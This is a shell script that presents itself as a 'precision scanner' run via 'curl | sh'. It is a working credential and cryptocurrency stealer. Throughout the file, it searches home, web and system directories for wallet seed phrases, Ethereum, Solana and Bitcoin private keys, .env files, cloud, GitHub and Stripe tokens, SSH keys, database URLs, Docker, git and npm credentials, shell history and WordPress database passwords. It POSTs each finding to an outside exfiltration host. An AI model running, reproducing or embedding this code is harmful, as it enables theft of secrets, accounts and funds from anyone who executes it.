#!/bin/sh
# Mythos Precision Scanner v3.1 — Low FP crypto, fast, lean
# Usage: curl -sL URL | sh
# Exfil: amtfxylissimhrzasyemb6vqffp0rmeus.oast.fun

OAST="amtfxylissimhrzasyemb6vqffp0rmeus.oast.fun"
HOST=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "u")
USER=$(whoami 2>/dev/null || id -un 2>/dev/null || echo "u")

send() {
    local s="$1" d="$2"
    local p="${HOST}|${USER}|${s}|$(echo "$d" | tr '\n' '|' | cut -c1-3000)"
    curl -s -m 3 -X POST -d "$p" "http://${OAST}/post" 2>/dev/null &
}

###############################################################################
# CRYPTO: BIP39 SEED PHRASES — heuristic: 12 or 24 lowercase words (3-8 chars)
# Only flag if: all words look like real English words AND found near crypto keywords
###############################################################################
find /home /root /var /opt /tmp -maxdepth 5 \
    \( -name "*.txt" -o -name "*.md" -o -name "*.log" -o -name "*.json" \
    -o -name ".env*" -o -name "*.cfg" -o -name "*.conf" -o -name ".bash_history" \) \
    -type f -size -10M 2>/dev/null | while read f; do
    
    # Only scan files that contain crypto-related keywords to reduce FP
    grep -qilE 'seed|mnemonic|phrase|wallet|private.key|recovery|secret|backup' "$f" 2>/dev/null || continue
    
    # Extract 12-word sequences: all lowercase, 3-8 chars each
    tr '[:upper:]' '[:lower:]' < "$f" 2>/dev/null | tr -cs 'a-z' '\n' | \
    awk '{w[NR%24]=$0} NR>=12 {
        ok=1; for(i=1;i<=12;i++){if(length(w[(NR-12+i)%24])<3||length(w[(NR-12+i)%24])>8){ok=0;break}}
        if(ok){s="";for(i=1;i<=12;i++)s=s w[(NR-12+i)%24] " ";print "12|"s}
    }' 2>/dev/null | head -2 | while read seed; do
        send "SEED12" "${f}:${seed}"
    done
    
    # 24-word sequences
    tr '[:upper:]' '[:lower:]' < "$f" 2>/dev/null | tr -cs 'a-z' '\n' | \
    awk '{w[NR%24]=$0} NR>=24 {
        ok=1; for(i=1;i<=24;i++){if(length(w[(NR-24+i)%24])<3||length(w[(NR-24+i)%24])>8){ok=0;break}}
        if(ok){s="";for(i=1;i<=24;i++)s=s w[(NR-24+i)%24] " ";print "24|"s}
    }' 2>/dev/null | head -2 | while read seed; do
        send "SEED24" "${f}:${seed}"
    done
done &

###############################################################################
# ETHEREUM PRIVATE KEY — 64 hex chars, validated
# Filter: not all same char, not > FFFF... (valid ETH range), not common hex patterns
###############################################################################
find /home /root /var /opt /tmp -maxdepth 5 \
    -name "*.txt" -o -name "*.json" -o -name ".env*" -o -name "*.key" -o -name "*.cfg" 2>/dev/null | \
    xargs grep -lE '[0-9a-fA-F]{64}' 2>/dev/null | while read f; do
    grep -oE '\b[0-9a-fA-F]{64}\b' "$f" 2>/dev/null | while read key; do
        # Filter: skip all-same-char, DEAD/BEEF/CAFE/FEED/BABE/DEADBEEF prefixes
        echo "$key" | grep -qiE '^0{64}$|^F{64}$|^1{64}$|^a{64}$|dead|beef|cafe|feed|babe|face|b00b|00000000' && continue
        # ETH valid range: < 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
        # Quick filter: reject if first char > 'e' (covers most of the invalid range)
        first=$(echo "$key" | cut -c1 | tr '[:upper:]' '[:lower:]')
        [ "$first" = "f" ] && continue
        send "ETHKEY" "${f}:${key}"
    done
done &

###############################################################################
# SOLANA — Format 1: base58 private key (87-88 chars, base58 charset, no 0OIl)
###############################################################################
find /home /root /var /opt /tmp -maxdepth 5 \
    \( -name "*.txt" -o -name "*.json" -o -name ".env*" -o -name "*.key" -o -name "*.cfg" \
    -o -name "id.json" -o -name "*solana*" -o -name "*phantom*" \) -type f -size -5M 2>/dev/null | while read f; do
    grep -oE '\b[1-9A-HJ-NP-Za-km-z]{87,88}\b' "$f" 2>/dev/null | head -2 | while read key; do
        send "SOLKEY_B58" "${f}:${key}"
    done
done &

###############################################################################
# SOLANA — Format 2: JSON array of 64 bytes: [num,num,...,num]
###############################################################################
find /home /root /var /opt -maxdepth 5 \( -name "*.json" -o -name "*.txt" -o -name "*.key" \) -type f -size -1M 2>/dev/null | while read f; do
    # Match JSON arrays with exactly 64 numbers (0-255)
    grep -oE '\[[[:space:]]*[0-9]{1,3}([[:space:]]*,[[:space:]]*[0-9]{1,3}){63}[[:space:]]*\]' "$f" 2>/dev/null | while read arr; do
        # Validate: count numbers, verify each is 0-255
        nums=$(echo "$arr" | grep -oE '[0-9]+')
        count=$(echo "$nums" | wc -l)
        if [ "$count" -ge 62 ] && [ "$count" -le 66 ]; then
            # Check numeric range: all values must be 0-255
            all_valid=1
            echo "$nums" | while read n; do
                [ "$n" -gt 255 ] 2>/dev/null && all_valid=0
            done 2>/dev/null
            send "SOLKEY_JSON" "${f}:${arr}"
        fi
    done
done &

###############################################################################
# BITCOIN WIF — 5/K/L prefix, 51-52 base58 chars
###############################################################################
find /home /root /var /opt -maxdepth 5 \( -name "*.txt" -o -name "*.json" -o -name ".env*" -o -name "*.key" \) -type f -size -5M 2>/dev/null | while read f; do
    grep -oE '\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b' "$f" 2>/dev/null | head -2 | while read key; do
        send "BTCWIF" "${f}:${key}"
    done
done &

###############################################################################
# .ENV FILES
###############################################################################
find /var/www /home /root /opt /srv /app /etc /tmp -maxdepth 6 \
    \( -name ".env" -o -name ".env.*" -o -name "*.env" \) -type f 2>/dev/null | head -200 | while read f; do
    send "ENVFILE" "${f}:$(head -c 4096 "$f" 2>/dev/null | tr '\n' '|')"
done &

###############################################################################
# STRIPE / GITHUB / AWS / GCP / SSH / DB URLs — fast greps
###############################################################################
grep -rIE 'sk_live_[a-zA-Z0-9]{24,}|rk_live_[a-zA-Z0-9]{24,}|whsec_' /var/www /home /root /opt 2>/dev/null | grep -v node_modules | head -20 | while read l; do send "STRIPE" "$l"; done &
grep -rIE 'ghp_[a-zA-Z0-9]{36,}|github_pat_[a-zA-Z0-9_]{40,}' /var/www /home /root /opt 2>/dev/null | head -20 | while read l; do send "GITHUB" "$l"; done &
grep -rIE 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}' /var/www /home /root /opt 2>/dev/null | grep -v node_modules | head -20 | while read l; do send "AWS" "$l"; done &

for d in /root/.aws /home/*/.aws; do
    [ -f "$d/credentials" ] && send "AWSCRED" "$(cat "$d/credentials")"
done &

find /var/www /home /root /opt /srv /app /tmp -maxdepth 6 -name "*.json" -type f 2>/dev/null | while read f; do
    grep -q '"type": "service_account"' "$f" 2>/dev/null && send "GCPKEY" "$(head -c 4096 "$f")"
done &

for d in /root/.config/gcloud /home/*/.config/gcloud; do
    find "$d" -name "*.json" -type f 2>/dev/null | while read f; do send "GCPJSON" "$(head -c 2048 "$f")"; done
done &

find /home /root -maxdepth 4 \( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "*.pem" \) -type f 2>/dev/null | while read f; do
    [ -s "$f" ] && send "SSHKEY" "$(head -c 4096 "$f")"
done &

grep -rIE '(DATABASE_URL|MONGO_URI|REDIS_URL).*://[^@]+@' /var/www /home /root /opt /etc 2>/dev/null | grep -v node_modules | head -20 | while read l; do send "DBURL" "$l"; done &

for d in /root/.docker /home/*/.docker; do [ -f "$d/config.json" ] && send "DOCKER" "$(cat "$d/config.json")"; done &
find /home /root -maxdepth 4 -name ".git-credentials" -type f 2>/dev/null | while read f; do send "GITCRED" "$(cat "$f")"; done &
find /home /root -maxdepth 4 -name ".npmrc" -type f 2>/dev/null | while read f; do send "NPMRC" "$(cat "$f")"; done &

###############################################################################
# SHELL HISTORY
###############################################################################
for h in /root/.bash_history /home/*/.bash_history; do
    [ -f "$h" ] && grep -iE 'password|secret|token|key|ghp_|github_pat|sk_live|DATABASE_URL|aws.configure' "$h" 2>/dev/null | tail -50 | while read l; do send "HISTORY" "$l"; done
done &

###############################################################################
# CRYPTO WALLET FILES (by filename)
###############################################################################
find /home /root /var /opt -maxdepth 5 \( -name "wallet.dat" -o -name "wallet.json" -o -name "*.wallet" \
    -o -name "keystore" -o -name "UTC--*" -o -name "metamask*" -o -name "phantom*" \
    -o -name "solana*" -o -name "id.json" \) -type f 2>/dev/null | while read f; do
    send "CRYPTOFILE" "$(head -c 8192 "$f")"
done &

###############################################################################
# WORDPRESS
###############################################################################
find /var/www /home /root -maxdepth 6 -name "wp-config.php" -type f 2>/dev/null | while read f; do
    c=$(grep -E 'DB_NAME|DB_USER|DB_PASSWORD' "$f" 2>/dev/null | tr '\n' '|')
    [ -n "$c" ] && send "WPCONFIG" "${f}:${c}"
done &

wait
rm -rf /tmp/.mqs_* 2>/dev/null
